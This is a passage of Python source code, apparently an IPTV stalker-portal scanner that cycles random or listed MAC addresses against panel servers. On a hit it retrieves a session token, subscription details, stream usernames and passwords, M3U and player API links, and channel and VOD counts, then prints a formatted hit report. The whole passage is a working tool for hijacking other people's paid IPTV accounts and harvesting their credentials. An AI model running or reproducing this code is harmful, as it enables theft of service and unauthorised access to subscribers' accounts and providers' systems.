				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=""
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				
				message=veri.split('message":"')[1].split(',')[0].replace('"','')
				message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
				
				
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))			
					mt=("""     
╭─➤ 🏴‍☠️🄺🄾🄽🅃🄾🔹🄸🄽🄵🄾🏴‍☠️
├◈ 📝 Pᴏᴡɪᴛᴀɴɪᴇ ➤ """+str(message)+""" 
├◈ 🌐 Hᴏsᴛ ➤ http://"""+panel+"""/c/
├◈ 🌍 Rᴇᴀʟ ➤ http://"""+realm+""":"""+port+"""/c/
├◈ #️⃣ Pᴏʀᴛ➤ """+port+"""
├◈ 👤 Lᴏɢɪɴ ➤ """+userm+"""
├◈ 🔑 Pᴀss ➤ """+pasm+"""
├◈ 📆 Wʏɢᴀsᴀ ➤ """+bitism+""" 
├◈ 🧑 Aᴋᴛʏᴡɴᴇ Pᴏʟąᴄᴢɴɪᴀ ➤ """+acon+"""
├◈ 👪 Mᴀᴋsʏᴍᴀʟɴᴇ Pᴏʟąᴄᴢᴇɴɪᴀ ➤ """+mcon+""" 
├◈ 🚦 Sᴛᴀᴛᴜs ➤ """+status+"""
├◈ 🕛 Sᴛʀᴇғᴀ Cᴢᴀsᴏᴡᴀ ➤ """+timezone+"""
╰─➤🎯 Aᴜᴛᴏʀ Sᴋᴀɴᴜ ➤  """+str(nickn)+""" """)
	except:pass
	return mt
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"		
panelsay=0	
bots =0
botsay=0
def basla():
	global panelsay,botsay
	for j in range(botkac):
		for i in open(pdosya, 'r'):
			t1 = threading.Thread(target=d1)
			t1.start()
		botsay=botsay+1
		panelsay=0

#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
def replace_status(status_code: int):
    status = f"{GREEN1}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ {status_code} ]{RESET}"
    if status_code == 200: status = f"{GREEN1}ᴀᴠᴀɪʟᴀʙʟᴇ [ 200 ]{RESET}"
    if status_code == 401: status = f"{MAGENTA}ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ [ 401 ]{RESET}"
    if status_code == 403: status = f"{RED}Fᴏʀʙɪᴅᴅᴇɴ [ 403 ]{RESET}"
    if status_code == 512: status = f"{BLUE1}Eʀʀᴏʀ [ 512 ]{RESET}"
    if status_code == 503: status = f"{MAGENTA}Sᴇʀᴠɪᴄᴇ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ [ 503 ]{RESET}"
    if status_code == 520: status = f"{MAGENTA}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ 520 ]{RESET}"
    if status_code == 404: status = f"{RED}ɴᴏᴛ Fᴏᴜɴᴅ [ 404 ]{RESET}"
    if status_code == 301: status = f"{BLUE1}ʀᴇᴅɪʀᴇᴄᴛ [ 301 ]{RESET}"
    if status_code == 500: status = f"{BLUE1}Sᴇʀᴠᴇʀ Eʀʀᴏʀ [ 500 ]{RESET}"
    if status_code == 429: status = f"{BLUE1}ᴛᴏᴏ ᴍᴀɴʏ ʀᴇqᴜᴇsᴛs [ 429 ]{RESET}"
    if status_code == 302: status = f"{BLUE1}ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ [ 302 ]{RESET}"
    return status
        
def replace_symbols(text):
    replacements = {
        "«»": "",
        "🔸AE": " |🇦🇪 AE",
        "🔸UAE": " |🇦🇪 UAE",
        "🔸ALL": " |🏁ALL",
        "🔸ALB": " |🇦🇱 ALB",
        "🔸ASIA": " 🈲️ ASIA",
        "🔸AR": " |🇸🇦 AR",
        "🔸AT": " |🇦🇹 AT",
        "🔸AU": " |🇦🇺 AU",
        "🔸AZ": " |🇦🇿 AZ",
        "🔸BE": " |🇧🇪 BE",
        "🔸BG": " |🇧🇬 BG",
        "🔸BIH": " |🇧🇦 BIH",
        "🔸BO": " |🇧🇴 BO",
        "🔸BR": " |🇧🇷 BR",
        "🔸CA": " |🇨🇦 CA",
        "🔸CH": " |🇨🇭 CH",
        "🔸SW": " |🇨🇭 SW",
        "🔸CL": " |🇨🇱 CL",
        "🔸CN": " |🇨🇳 CN",
        "🔸CO": " |🇨🇴 CO",
        "🔸CR": " |🇭🇷 CR",
        "🔸CZ": " |🇨🇿 CZ",
        "🔸DE": " |🇩🇪 DE",
        "🔸DK": " |🇩🇰 DK",
        "🔸DM": " |🇩🇰 DM",
        "🔸EC": " |🇪🇨 EC",
        "🔸EG": " |🇪🇬 EG",
        "🔸EN": " |🇬🇧 EN",
        "🔸GB": " |🇬🇧 GB",
        "🔸UK": " |🇬🇧 UK",
        "🔸EU": " |🇪🇺 EU",
        "🔸ES": " |🇪🇸 ES",
        "🔸SP": " |🇪🇸 SP",
        "🔸EX": " |🇭🇷 EX",
        "🔸YU": " |🇭🇷 YU",
        "🔸FI": " |🇫🇮 FI",
        "🔸FR": " |🇫🇷 FR",
        "🔸GOR": " |🇲🇪 GOR",
        "🔸GR": " |🇬🇷 GR",
        "🔸HR": " |🇭🇷 HR",
        "🔸HU": " |🇭🇺 HU",
        "🔸IE": " |🇮🇪 IE",
        "🔸IL": " |🇮🇪 IL",
        "🔸IR": " |🇮🇪 IR",
        "🔸ID": " |🇮🇩 ID",
        "🔸IN": " |🇮🇳 IN",
        "🔸IT": " |🇮🇹 IT",
        "🔸JP": " |🇯🇵 JP",
        "🔸KE": " |🇰🇪 KE",
        "🔸KU": " |🇭🇺 KU",
        "🔸KR": " |🇰🇷 KR",
        "🔸LU": " |🇱🇺 LU",
        "🔸MKD": " |🇲🇰 MKD",
        "🔸MX": " |🇲🇽 MX",
        "🔸MY": " |🇲🇾 MY",
        "🔸NETFLIX": " | 🚩 NETFLIX",
        "🔸NG": " |🇳🇬 NG",
        "🔸NZ": " |🇳🇿 NZ",
        "🔸NL": " |🇳🇱 NL",
        "🔸NO": " |🇳🇴 NO",
        "🔸PA": " |🇵🇦 PA",
        "🔸PE": " |🇵🇪 PE",
        "🔸PH": " |🇵🇭 PH",
        "🔸PK": " |🇵🇰 PK",
        "🔸PL": " |🇵🇱 PL",
        "🔸POLSKA": " |🇵🇱 PL - POLSKA",
        "🔸POLAND": " |🇵🇱 PL - POLSKA",
        "🔸PT": " |🇵🇹 PT",
        "🔸PPV": " |🏋🏼‍♂️ PPV",
        "🔸QA": " |🇶🇦 QA",
        "🔸RO": " |🇷🇴 RO",
        "🔸RU": " |🇷🇺 RU",
        "🔸SA": " |🇸🇦 SA",
        "🔸SCREENSAVER": " | 🏞 SCREENSAVER",
        "🔸SE": " |🇸🇪 SE",
        "🔸SK": " |🇸🇰 SK",
        "🔸SL": " |🇸🇮 SL",
        "🔸SG": " |🇸🇬 SG",
        "🔸SR": " |🇷🇸 SR",
        "🔸SU": " |🇦🇲 SU",
        "🔸TH": " |🇹🇭 TH",
        "🔸TR": " |🇹🇷 TR",
        "🔸TW": " |🇹🇼 TW",
        "🔸UKR": " |🇺🇦 UKR",
        "🔸US": " |🇺🇸 US",
        "🔸VN": " |🇻🇳 VN",
        "🔸VIP": " |⚽️ VIP",
        "🔸WEB": " |🏳️‍🌈 WEB",
        "🔸ZA": " |🇿🇦 ZA",
        "🔸AF": " |🇿🇦 AF",
        "🔸ADU": " |🔞 ADULTS",
        "🔸FO": " |🔞 FOR",
        "🔸⋅ FOR": " |🔞 ⋅ FOR",
        "🔸BLU": " |🔞 BLU",
        "🔸XXX": " |🔞 XXX",
        "🔸": "  🔸 "
    }

    for old, new in replacements.items():
        text = text.replace(old, new)

    return text.upper()
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added

def d1():
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
	global status_code
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
	global hitc
	global hitr
	global tokenr,bots,panelsay,botsay,bot
	panel=(paneltotLen[panelsay].replace('\n',''))
	panel=panel.replace("http://","")
	panel=panel.replace("/c","")
	panel=panel.replace('stalker_portal','/stalker_portal')
	panel=panel.replace("/","")
	panelsay=panelsay+1
	bots=bots+1
	for mc in range(botsay,macuz,4):
		total=mc
		if dsyno=="0":
		    mac=randommac()
		    mac=mac.upper()
		else:
		    #mac=mactotLen[mc].replace('\n','')
		    macv=re.search(pattern,mactotLen[mac],re.IGNORECASE)
		    if macv:
		        mac=macv.group()
		    else:
		         continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_"+str(int(bots+1))
		oran=""
		oran=round(((total)/(macuz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr,panel)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1(panel), headers=hea1(panel,macs), timeout=15, verify=False)
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
				
				status_code=f"{replace_status(res.status_code)}"
				
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Added
				veri=str(res.text)
				break
			except:
				break
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr=MAGENTA
		if 'token' in veri:
			tokenr=RESET
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url22(panel,macs), headers=hea2(macs,token,panel), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     adult=veri.split('parent_password":"')[1]
			     adult=adult.split('","bright')[0]
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3(panel), headers=hea2(macs,token,panel), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr=FCYAN
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Dni")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Dni")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
			     			#print(str(url6(panel)+"6"))
				     		res = ses.get(url6(panel), headers=hea2(macs,token,panel), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(str(cid),panel), headers=hea2(macs,token,panel), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8" 
				     		durum=goruntu(link,panel)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token,panel)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token,panel)
			     		
			     	SN=(hashlib.md5(macs.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(macs.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(macs)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()

			     	url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
			     	while True:
			     	            		try:
			     	            			res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
			     	            			break
 			     	           		except:
 			     	           			bag1=bag1+1
 			     	           			time.sleep(2)
 			     	           			if bag1==4:
			     	            			 	break

			     	bag1=0
			     	veri=str(res.text)
			     	kanalsayisi=str(veri.count("stream_id"))
			     	#print(kanalsayisi)
			     	url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			     	while True:
			     	            		try:
			     	            			res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
			     	            			break
 			     	           		except:
 			     	           			bag1=bag1+1
 			     	           			time.sleep(2)
			     	            			if bag1==4:
			     	            			 	break
			     	bag1=0
			     	veri=str(res.text)
			     	filmsayisi=str(veri.count("stream_id"))
            	
			     	url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			     	while True:
			     	            		try:
			     	            			res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
			     	            			break
			     	            		except:
			     	            			bag1=bag1+1
 			     	           			time.sleep(2)
			     	            			if bag1==4:
 			     	           			 	break
			     	bag1=0
			     	veri=str(res.text)
			     	dizisayisi=str(veri.count("series_id"))
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" ʙʀᴀᴋ ᴀᴅʀᴇsᴜ ɪᴘ ᴋʟɪᴇɴᴛᴀ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl(panel)
			     		livel=' ♦️ '
			     		livelist=list(listlink,macs,token,livel,panel)
			     	if kanalkata=="2":
			     		listlink=vodurl(panel)
			     		livel=' 🔹 '
			     		vodlist=list(listlink,macs,token,livel,panel)
			     		listlink=seriesurl(panel)
			     		livel=' 🔸 '
			     		serieslist=list(listlink,macs,token,livel,panel)
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Add new
			     	if kanalkata == "1" or kanalkata == "2":
			     		listlink = liveurl(panel)
			     		livel = '🔸'
			     		livelist = replace_symbols(list(listlink,macs,token,livel,panel))
			     	if kanalkata == "2":
			     		listlink = vodurl(panel)
			     		livel = '🔸'
			     		vodlist = replace_symbols(list(listlink,macs,token,livel,panel))
			     	if kanalkata == "2":
			     		listlink = seriesurl(panel)
			     		livel = '🔸'
			     		serieslist = replace_symbols(list(listlink,macs,token,livel,panel))
#SᴍᴀʟʟҒɪx ༺ ᶫˣ ༻
#Add new
			     	hit(mac,trh,panel,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi,adult)

basla()